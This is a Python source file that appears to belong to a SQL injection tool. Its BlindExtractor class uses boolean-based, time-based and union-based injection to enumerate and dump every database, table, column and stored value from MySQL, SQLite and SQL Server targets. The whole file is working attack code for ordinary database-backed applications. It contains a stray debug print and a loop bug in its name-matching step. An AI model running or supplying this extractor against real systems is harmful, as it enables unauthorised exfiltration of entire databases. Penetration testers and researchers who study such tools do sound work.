from re import findall

from injections.BooleanInjector import BooleanInjector
from injections.TimeInjector import TimeInjector
from injections.UnionInjector import UnionInjector
from utils.constants import (
    HEIGH_COL_VALUE_LENGTH,
    HEIGH_ELEMENT_COUNT,
    HEIGH_ELEMENT_NAME_LENGTH,
    HEIGH_MAX_CHAR_LENGTH,
    NUMERIC_TYPES,
    RESET,
    STRING_TYPES,
    YELLOW,
    InjectionContext,
    fingerprints,
)
from utils.Logger import Logger
from utils.parse import is_system_db
from utils.print import string_to_sql_char


class BlindExtractor:
    def __init__(
        self,
        time: TimeInjector,
        boolean: BooleanInjector,
        union: UnionInjector,
    ):
        self.time = time
        self.boolean = boolean
        self.union = union
        self.database_engine = ""

    def set_database_engine(self, database_engine: str) -> None:
        self.database_engine = database_engine

    def find_words(self, body: str, start: str, end: str, length: int) -> list[str]:
        """Find unique words matching a regex in the given text."""
        pattern = rf"\b{start}\w{{{length - 2}}}{end}\b"
        return list(dict.fromkeys(findall(pattern, body)))

    def find_db_elem_name(
        self,
        param: str,
        ctx: InjectionContext,
        boolInjection: bool,
        db_elem: str,
        expression: str,
        union_expression: str,
    ) -> str:
        """
        Compute a database element's name
        """

        get_chars = (
            self.boolean.get_string_chars_at_index
            if boolInjection
            else self.time.get_string_chars_at_index
        )

        get_number = self.boolean.get_number if boolInjection else self.time.get_number

        get_string = self.boolean.get_string if boolInjection else self.time.get_string

        # Test if we can get the element's name included in the injection's response body
        body_containing_name = self.union.test_expressions_name(
            param, ctx, union_expression
        )

        # Get the database element's name length
        length_expression = fingerprints[self.database_engine.lower()].length
        name_length_expression = length_expression.format(expression=expression)

        max_length = (
            HEIGH_COL_VALUE_LENGTH if db_elem == "value" else HEIGH_ELEMENT_NAME_LENGTH
        )

        name_length = get_number(param, ctx, name_length_expression, max_length)

        Logger.debug(
            f"Found database element's name length: {YELLOW}{name_length}{RESET}"
        )

        if not name_length:
            return ""

        # Better simply compute for each character if length is short
        if name_length < 5:
            return get_string(self.database_engine, param, ctx, expression, name_length)

        if body_containing_name:
            # Find the first and the last character in the database element's name
            first_last_chars = get_chars(
                self.database_engine, param, ctx, expression, [1, name_length]
            )

            Logger.debug(
                f"First char: {first_last_chars[0]}, last char: {first_last_chars[1]}"
            )

            # Look for words in the response body that has the right length and first/last char
            words = self.find_words(
                body_containing_name,
                first_last_chars[0],
                first_last_chars[1],
                name_length,
            )

            if words:
                Logger.debug(
                    f"Found words in the body with the right length and starting/ending characters:\n{words}\n"
                )

                # If we only have one result we return it
                length = len(words)
                if length == 1:
                    return words[0]

                elif length > 1:
                    corresponding_names: list[str] = []

                    second_and_one_before_last_chars = get_chars(
                        self.database_engine,
                        param,
                        ctx,
                        expression,
                        [2, name_length - 1],
                    )

                    Logger.debug(
                        f"Second char: {second_and_one_before_last_chars[0]}, "
                        f"one before last char: {second_and_one_before_last_chars[1]}"
                    )

                    for name in corresponding_names:
                        if (
                            name[1] == second_and_one_before_last_chars[0]
                            and name[name_length - 2]
                            == second_and_one_before_last_chars[1]
                        ):
                            corresponding_names.append(name)

                    # If we only have one result we return it
                    if len(corresponding_names) == 1:
                        return corresponding_names[0]
                    # Compute each character to find out the whole name

        return get_string(self.database_engine, param, ctx, expression, name_length)

    def dump_db_elem_entries(
        self,
        param: str,
        ctx: InjectionContext,
        column_count: int,
        boolInjection: bool,
        db_elem: str,
        select: str,
        frm: str,
        where: str,
        limit: str,
        data_type: str = "varchar",
    ) -> list[str]:
        """
        Get the number of entries that the database element (table, column) has,
        then create a loop in which each entry is found by binary search.
        All entries are finally returned as a list.
        """
        results = []

        db_elem_count_expression = f"(SELECT COUNT(*) {frm} {where})"

        Logger.info(db_elem_count_expression)

        get_number = self.boolean.get_number if boolInjection else self.time.get_number

        # Get the number of database element's entries on the database
        db_elem_count = get_number(
            param, ctx, db_elem_count_expression, HEIGH_ELEMENT_COUNT
        )

        Logger.success(f"Found {db_elem} count: {YELLOW}{db_elem_count}{RESET}")

        # Find name for each database element's entry
        for elem in range(db_elem_count):
            limit_expression1 = limit.format(nbr=elem)

            expression = f"({select} {frm} {where} {limit_expression1})"

            limit_expression2 = limit.format(nbr=elem + 1)

            # Limit is one further as it prints the first SELECT results at index 0
            union_expression = f"""
                {select},{self.union.get_nulls(self.database_engine, param, ctx, column_count)}
                {frm}
                {where}
                {limit_expression2}
            """
            print("datatypeeee:", data_type.lower())
            if data_type.lower() in STRING_TYPES:
                db_elem_name = self.find_db_elem_name(
                    param,
                    ctx,
                    boolInjection,
                    db_elem,
                    expression,
                    union_expression,
                )
            elif data_type.lower() in NUMERIC_TYPES:
                db_elem_name = get_number(param, ctx, expression, 2000)
            else:
                db_elem_name = "-"

            if db_elem_name:
                results.append(db_elem_name)
                Logger.success(
                    f"Found {db_elem} string #{elem + 1}: {YELLOW}{db_elem_name}{RESET}\n"
                )

        return results

    def dump_mysql(
        self,
        param: str,
        ctx: InjectionContext,
        column_count: int,
        boolInjection: bool,
    ) -> dict:
        """Dump all databases"""

        dump = {}

        """
        Get all database names.
          """

        db_names = self.dump_db_elem_entries(
            param,
            ctx,
            column_count,
            boolInjection,
            "database",
            "SELECT schema_name",
            "FROM information_schema.schemata",
            "",
            fingerprints[self.database_engine.lower()].limit,
        )

        """
        Get the table names of the current database.
        """
        for _, db_name in enumerate(db_names):
            # We ignore databases auto-generated by the system
            if is_system_db(db_name):
                Logger.info(f"Skipping system schema {db_name}...")
            else:
                sql_db_name = string_to_sql_char(db_name)
                dump[db_name] = {}  # create an entry for the current database

                table_names = self.dump_db_elem_entries(
                    param,
                    ctx,
                    column_count,
                    boolInjection,
                    "table",
                    "SELECT table_name",
                    "FROM information_schema.tables",
                    f"WHERE table_schema = {sql_db_name}",
                    fingerprints[self.database_engine.lower()].limit,
                )

                """
                Get the column names of the current table.
                """

                for table in table_names:
                    dump[db_name][table] = {}

                    sql_table_name = string_to_sql_char(table)
                    column_names = self.dump_db_elem_entries(
                        param,
                        ctx,
                        column_count,
                        boolInjection,
                        "column",
                        "SELECT column_name",
                        "FROM information_schema.columns",
                        f"WHERE table_schema = {sql_db_name} AND table_name = {sql_table_name}",
                        fingerprints[self.database_engine.lower()].limit,
                    )

                    """
                    Get metadata and values of the current column.
                    """

                    for col in column_names:
                        sql_col_name = string_to_sql_char(col)

                        # Data type of the column
                        data_type = self.dump_db_elem_entries(
                            param,
                            ctx,
                            column_count,
                            boolInjection,
                            "value",
                            "SELECT data_type",
                            "FROM information_schema.columns",
                            f"WHERE table_schema = {sql_db_name} "
                            f"AND table_name = {sql_table_name} "
                            f"AND column_name = {sql_col_name}",
                            fingerprints[self.database_engine.lower()].limit,
                        )[0]

                        get_number = (
                            self.boolean.get_number
                            if boolInjection
                            else self.time.get_number
                        )

                        # The maximum character length of the values in the column
                        character_maximum_length = (
                            get_number(
                                param,
                                ctx,
                                "(SELECT character_maximum_length "
                                "FROM information_schema.columns "
                                f"WHERE table_schema = {sql_db_name} "
                                f"AND table_name = {sql_table_name} "
                                f"AND column_name = {sql_col_name})",
                                HEIGH_MAX_CHAR_LENGTH,
                            )
                            if data_type.lower() in STRING_TYPES
                            else None
                        )

                        # All the values in the columns
                        values = self.dump_db_elem_entries(
                            param,
                            ctx,
                            column_count,
                            boolInjection,
                            "value",
                            f"SELECT `{col}`",
                            f"FROM `{db_name}`.`{table}`",
                            "",
                            fingerprints[self.database_engine.lower()].limit,
                            data_type,
                        )

                        dump[db_name][table][col] = {
                            "data_type": data_type if data_type else None,
                            "character_maximum_length": character_maximum_length,
                            "values": values,
                        }
        return dump

    def dump_sqlite(
        self,
        param: str,
        ctx: InjectionContext,
        column_count: int,
        boolInjection: bool,
    ) -> dict:
        """Dump tables, columns, metadata, and values from a SQLite database."""

        dump = {"main": {}}

        # Get all user tables from SQLite's catalog.
        table_names = self.dump_db_elem_entries(
            param,
            ctx,
            column_count,
            boolInjection,
            "table",
            "SELECT name",
            "FROM sqlite_master",
            "WHERE type='table' AND name NOT LIKE 'sqlite_%'",
            fingerprints[self.database_engine.lower()].limit,
        )

        for table in table_names:
            dump["main"][table] = {}

            sql_table = string_to_sql_char(table)

            # Get column names and declared types.
            column_names = self.dump_db_elem_entries(
                param,
                ctx,
                column_count,
                boolInjection,
                "column",
                "SELECT name",
                f"FROM pragma_table_info({sql_table})",
                "",
                fingerprints[self.database_engine.lower()].limit,
            )

            for column in column_names:
                sql_column = string_to_sql_char(column)

                # Get the declared SQLite type.
                data_type = self.dump_db_elem_entries(
                    param,
                    ctx,
                    column_count,
                    boolInjection,
                    "value",
                    "SELECT type",
                    f"FROM pragma_table_info({sql_table})",
                    f"WHERE name = {sql_column}",
                    fingerprints[self.database_engine.lower()].limit,
                )[0]

                # Get the actual column values.
                values = self.dump_db_elem_entries(
                    param,
                    ctx,
                    column_count,
                    boolInjection,
                    "value",
                    f'SELECT "{column}"',
                    f'FROM "{table}"',
                    "",
                    fingerprints[self.database_engine.lower()].limit,
                    data_type,
                )

                # SQLite does not have an equivalent to
                # information_schema.columns.character_maximum_length.
                dump["main"][table][column] = {
                    "data_type": data_type if data_type else None,
                    "character_maximum_length": None,
                    "values": values,
                }

        return dump

    def dump_mssql(
        self,
        param: str,
        ctx: InjectionContext,
        column_count: int,
        boolInjection: bool,
    ) -> dict:
        """Dump SQL Server databases, tables, columns, metadata and values."""

        dump = {}

        # Get database names
        db_names = self.dump_db_elem_entries(
            param,
            ctx,
            column_count,
            boolInjection,
            "database",
            "SELECT name",
            "FROM sys.databases",
            "WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb')",
            fingerprints[self.database_engine.lower()].limit.format(element="name"),
        )

        for db_name in db_names:
            dump[db_name] = {}

            # Get tables
            table_names = self.dump_db_elem_entries(
                param,
                ctx,
                column_count,
                boolInjection,
                "table",
                "SELECT TABLE_NAME",
                "FROM INFORMATION_SCHEMA.TABLES",
                f"WHERE TABLE_CATALOG = '{db_name}' AND TABLE_TYPE = 'BASE TABLE'",
                fingerprints[self.database_engine.lower()].limit.format(
                    element="TABLE_NAME"
                ),
            )

            for table in table_names:
                dump[db_name][table] = {}

                # Get columns
                column_names = self.dump_db_elem_entries(
                    param,
                    ctx,
                    column_count,
                    boolInjection,
                    "column",
                    "SELECT COLUMN_NAME",
                    "FROM INFORMATION_SCHEMA.COLUMNS",
                    f"WHERE TABLE_CATALOG = '{db_name}' AND TABLE_NAME = '{table}'",
                    fingerprints[self.database_engine.lower()].limit.format(
                        element="COLUMN_NAME"
                    ),
                )

                for col in column_names:
                    # Data type
                    data_type = self.dump_db_elem_entries(
                        param,
                        ctx,
                        column_count,
                        boolInjection,
                        "value",
                        "SELECT DATA_TYPE",
                        "FROM INFORMATION_SCHEMA.COLUMNS",
                        f"WHERE TABLE_CATALOG = '{db_name}' "
                        f"AND TABLE_NAME = '{table}' "
                        f"AND COLUMN_NAME = '{col}'",
                        fingerprints[self.database_engine.lower()].limit.format(
                            element="DATA_TYPE"
                        ),
                    )[0]

                    get_number = (
                        self.boolean.get_number
                        if boolInjection
                        else self.time.get_number
                    )

                    character_maximum_lengths = (
                        get_number(
                            param,
                            ctx,
                            "(SELECT CHARACTER_MAXIMUM_LENGTH "
                            "FROM INFORMATION_SCHEMA.COLUMNS "
                            f"WHERE TABLE_CATALOG = '{db_name}' "
                            f"AND TABLE_NAME = '{table}' "
                            f"AND COLUMN_NAME = '{col}')",
                            HEIGH_MAX_CHAR_LENGTH,
                        )
                        if data_type.lower() in STRING_TYPES
                        else None
                    )

                    # Values
                    #
                    # QUOTENAME() is preferable when generating identifiers,
                    # but if your existing UNION abstraction requires literal
                    # identifiers, keep the identifier quoting consistent with
                    # the rest of your implementation.
                    values = self.dump_db_elem_entries(
                        param,
                        ctx,
                        column_count,
                        boolInjection,
                        "value",
                        f"SELECT [{col}]",
                        f"FROM [{db_name}].[dbo].[{table}]",
                        "",
                        fingerprints[self.database_engine.lower()].limit.format(
                            element=f"[{col}]"
                        ),
                        data_type,
                    )

                    dump[db_name][table][col] = {
                        "data_type": data_type if data_type else None,
                        "character_maximum_length": (
                            character_maximum_lengths
                            if character_maximum_lengths
                            else None
                        ),
                        "values": values,
                    }

        return dump

    def dump_db(
        self,
        param: str,
        ctx: InjectionContext,
        column_count: int,
        boolInjection: bool,
    ) -> dict:
        """
        Dump database according to its engine type
        """

        engine = self.database_engine.lower()

        if engine == "sqlite":
            return self.dump_sqlite(
                param,
                ctx,
                column_count,
                boolInjection,
            )

        if engine == "microsoft sql server":
            return self.dump_mssql(
                param,
                ctx,
                column_count,
                boolInjection,
            )

        return self.dump_mysql(
            param,
            ctx,
            column_count,
            boolInjection,
        )
